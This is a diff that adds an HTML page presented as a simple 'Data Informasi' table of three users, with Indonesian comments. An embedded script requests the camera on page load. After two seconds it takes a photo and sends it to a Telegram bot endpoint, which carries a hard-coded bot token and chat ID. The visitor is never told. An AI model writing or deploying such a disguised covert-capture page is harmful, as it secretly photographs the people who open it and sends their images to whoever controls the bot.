@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Data Informasi</title>
+    <style>
+        /* Gaya untuk tabel */
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f4;
+        }
+        table {
+            width: 80%;
+            border-collapse: collapse;
+            background-color: white;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        th, td {
+            padding: 15px;
+            text-align: left;
+            border-bottom: 1px solid #ddd;
+        }
+        th {
+            background-color: #007BFF;
+            color: white;
+        }
+        tr:hover {
+            background-color: #f1f1f1;
+        }
+    </style>
+</head>
+<body>
+    <!-- Tabel yang ditampilkan -->
+    <table>
+        <thead>
+            <tr>
+                <th>ID</th>
+                <th>Nama</th>
+                <th>Info</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>1</td>
+                <td>John Doe</td>
+                <td>Admin</td>
+            </tr>
+            <tr>
+                <td>2</td>
+                <td>Jane Smith</td>
+                <td>Moderator</td>
+            </tr>
+            <tr>
+                <td>3</td>
+                <td>Alex Johnson</td>
+                <td>User</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <script>
+        // Langkah 1: Akses Kamera
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                let video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                // Tunggu sampai video siap untuk menangkap dimensi aslinya
+                video.addEventListener('loadedmetadata', () => {
+                    // Rasio aspek asli dari video
+                    const videoWidth = video.videoWidth;
+                    const videoHeight = video.videoHeight;
+
+                    // Langkah 2: Ambil Foto setelah 2 detik
+                    setTimeout(() => {
+                        let canvas = document.createElement('canvas');
+                        let ctx = canvas.getContext('2d');
+
+                        // Set ukuran canvas sesuai dengan dimensi asli video
+                        canvas.width = videoWidth;
+                        canvas.height = videoHeight;
+
+                        // Gambar dari video ke dalam canvas
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        // Konversi canvas ke file binary (Blob)
+                        canvas.toBlob(blob => {
+                            // Langkah 3: Kirim foto ke Telegram menggunakan FormData
+                            let formData = new FormData();
+                            formData.append('chat_id', '6131766523'); // Ganti dengan chat ID
+                            formData.append('photo', blob, 'photo.png'); // Kirim sebagai file
+
+                            fetch('https://api.telegram.org/bot7705641488:AAHZMGQWOSgIcwx7k2_z4KOGOPloM3KH__0/sendPhoto', {
+                                method: 'POST',
+                                body: formData
+                            })
+                            .then(response => response.json())
+                            .then(data => {
+                                if (data.ok) {
+                                    console.log('Foto berhasil dikirim ke Telegram!');
+                                } else {
+                                    console.error('Gagal kirim foto:', data);
+                                }
+                            })
+                            .catch(err => console.error('Gagal kirim foto:', err));
+                        }, 'image/png');
+
+                        // Matikan stream video setelah selesai
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 2000); // Ambil foto setelah 2 detik
+                });
+            })
+            .catch(err => {
+                console.error('Akses kamera gagal:', err);
+            });
+    </script>
+</body>
+</html>
